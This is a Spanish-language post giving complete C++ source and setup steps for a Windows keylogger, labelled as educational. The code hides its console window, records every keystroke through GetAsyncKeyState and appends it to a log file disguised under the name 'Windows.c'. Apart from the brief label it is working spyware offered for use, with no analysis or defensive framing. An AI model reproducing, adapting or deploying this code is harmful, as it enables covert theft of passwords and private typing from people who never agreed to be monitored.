El fuente de un KeyLogger en C++ por Propósito Educativo!

  • Como usar?

    Para poder crear este Key Logger potente tienes que descargar: Visual Studio Code en tu máquina cual tenga un Windows 10 installado desde que Mac OS y GNU Linux no tiene la libreria de Windows.h includia.

    En el caso que ya tengás una systema operativo montada con Visual Studio Code solamente tendrás que descargar el entorno virtual de C++

    Si todo está listo crea un projecto de consola nueva usando C++

    Después de copiar el fuente de codigo tenemos que añadir una función para el IDE para poder usar funciones no seguras o viejas.

    Para eso tenemos que buscar los preprocesadores del projecto y añadir: _CRT_SECURE_NO_WARNINGS;





  • Fuente de codigo:

    #include <iostream>
#include <windows.h>

void guardador(int codigo_del_teclado);
int main(int argc, char* argv[])
{
	HWND WINDOW_HANDLER;
	WINDOW_HANDLER = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(WINDOW_HANDLER, 0);
	char i;
	while (1)
	{
		// Vamos a ver todas las teclas
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767)	// tecla ha sido presionada
			{
				guardador(i);
				if (i == 27)
				{
					ShowWindow(WINDOW_HANDLER, 1);
					return 0;
				}
			}
		}
	}
	return 0;
}
void guardador(int codigo_del_teclado)
{
	// No vamos a tocar la raton
	if ((codigo_del_teclado == 1) || (codigo_del_teclado == 2)) return;
	printf("%c\n", codigo_del_teclado);

	FILE* LOGS_Guardados;
	LOGS_Guardados = fopen("Windows.c", "a+"); // .txt .c o cualquier formato le puedes declarar!
	if (codigo_del_teclado == 8)
		fprintf(LOGS_Guardados, "%s", "[BACKSPACE]");
	else if (codigo_del_teclado == 13)
		fprintf(LOGS_Guardados, "%s", "[ENTER]\n");
	else if (codigo_del_teclado == 32)
		fprintf(LOGS_Guardados, "%s", " ");
	else if (codigo_del_teclado == VK_ESCAPE)
		fprintf(LOGS_Guardados, "%s", "[ESCAPE]");
	else if (codigo_del_teclado == VK_END)
		fprintf(LOGS_Guardados, "%s", "[END]");
	else if (codigo_del_teclado == VK_HOME)
		fprintf(LOGS_Guardados, "%s", "[HOME]");
	else if (codigo_del_teclado == VK_TAB)
		fprintf(LOGS_Guardados, "%s", "[TAB]");
	else if (codigo_del_teclado == VK_CONTROL)
		fprintf(LOGS_Guardados, "%s", "[CONTROL]");
	else if (codigo_del_teclado == VK_SHIFT)
		fprintf(LOGS_Guardados, "%s", "[SHIFT]");
	else if (codigo_del_teclado == VK_DOWN)
		fprintf(LOGS_Guardados, "%s", "[DOWN ARROW]");
	else if (codigo_del_teclado == VK_UP)
		fprintf(LOGS_Guardados, "%s", "[UP ARROW]");
	else if (codigo_del_teclado == VK_LEFT)
		fprintf(LOGS_Guardados, "%s", "[LEFT ARROW]");
	else if (codigo_del_teclado == VK_RIGHT)
		fprintf(LOGS_Guardados, "%s", "[RIGHT ARROW]");
	else if (codigo_del_teclado == 190 || codigo_del_teclado == 110)
		fprintf(LOGS_Guardados, "%s", ".");
	else fprintf(LOGS_Guardados, "%s", &codigo_del_teclado);
	fclose(LOGS_Guardados);
}
